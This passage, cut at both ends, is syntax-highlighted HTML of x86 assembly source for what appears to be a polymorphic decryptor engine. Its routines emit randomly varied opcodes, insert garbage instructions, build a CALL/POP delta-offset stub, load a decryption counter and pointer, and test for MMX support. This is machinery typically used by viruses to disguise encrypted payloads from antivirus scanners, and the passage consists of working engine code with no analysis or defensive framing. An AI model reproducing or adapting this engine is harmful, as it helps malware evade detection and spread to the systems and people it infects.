    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@1</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@4</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@5</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@6</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@c4mmx_a_@@7</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ZERO EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">                  </span><span class="sc1">; SUB EAX,-1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@7</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ZERO EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">                  </span><span class="sc1">; ADD EAX,1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ZERO EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">                  </span><span class="sc1">; STC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1DF9h</span><span class="sc0">                        </span><span class="sc1">; SBB EAX,-2</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ZERO EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">                  </span><span class="sc1">; STC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15F9h</span><span class="sc0">                        </span><span class="sc1">; ADC EAX,00000000</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                          </span><span class="sc1">; OR EAX,-1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; AND EAX,1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">       
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9058016Ah</span><span class="sc0">                   </span><span class="sc1">; PUSH 01</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; POP EAX</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">                  </span><span class="sc1">; ZERO EAX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; INC EAX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_a</span><span class="sc0">
</span><span class="sc5">@@c4mmx_a_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                         </span><span class="sc1">; MOV EAX,1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">@@c4mmx_over_a</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A20Fh</span><span class="sc0">                       </span><span class="sc1">; CPUID</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@clear_mask</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_mask</span><span class="sc4">],</span><span class="sc5">_EDX</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@c4mmx_b_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@c4mmx_b_@@2</span><span class="sc0">

</span><span class="sc5">@@c4mmx_b_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">17E2BA0Fh</span><span class="sc0">                   </span><span class="sc1">; BT EDX,17h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; JC $+??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_b</span><span class="sc0">
</span><span class="sc5">@@c4mmx_b_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000C2F7h</span><span class="sc0">                   </span><span class="sc1">; TEST EDX,00400000h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; JZ $+??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00740040h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@c4mmx_over_b</span><span class="sc0">
</span><span class="sc5">@@c4mmx_b_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7218EAC1h</span><span class="sc0">                   </span><span class="sc1">; SHR EDX,18h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; JC $+??</span><span class="sc0">
</span><span class="sc5">@@c4mmx_over_b</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Fake data for temp. fill</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                         </span><span class="sc1">; RET</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptrto2nd</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@init_mmx?</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_CHECK4MMX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate a routine for get the pseudo delta-offset, which will look like</span><span class="sc0">
</span><span class="sc1">; this one:</span><span class="sc0">
</span><span class="sc1">;       CALL    @@1</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;  @@1: POP     REG</span><span class="sc0">

</span><span class="sc5">@@gen_deltaoffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@tmp_call</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@tmp_call</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@fix1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_DELTAOFFSET</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate a routine for put in the register used as counter the size of the</span><span class="sc0">
</span><span class="sc1">; code we want to decrypt</span><span class="sc0">

</span><span class="sc5">@@gen_loadsize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_LOADSIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gls_@@2</span><span class="sc0">
</span><span class="sc5">@@gls_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                          </span><span class="sc1">; PUSH size</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; POP reg_size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size_address</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size2cryptd4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@gls_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                        </span><span class="sc1">; MOV reg_size,size</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size_address</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size2cryptd4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the code that will make the pointer register to point exactly to</span><span class="sc0">
</span><span class="sc1">; the beginning of the code we want to encrypt or decrypt</span><span class="sc0">

</span><span class="sc5">@@gen_loadpointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@fix1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@fix2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@lp_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@lp_@@2</span><span class="sc0">
</span><span class="sc5">@@lp_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">                          </span><span class="sc1">; LEA reg_ptr,[reg_delta+fix]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@lp_</span><span class="sc0">
</span><span class="sc5">@@lp_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">                          </span><span class="sc1">; MOV reg_ptr,reg_delta</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; ADD reg_ptr,fix</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@lp_</span><span class="sc0">
</span><span class="sc5">@@lp_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@clear_mask</span><span class="sc0">                    </span><span class="sc1">; MOV reg_mask,fix2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">                  </span><span class="sc1">; LEA reg_ptr,[reg_mask+reg_delta+(fix+fix2)]</span><span class="sc0">
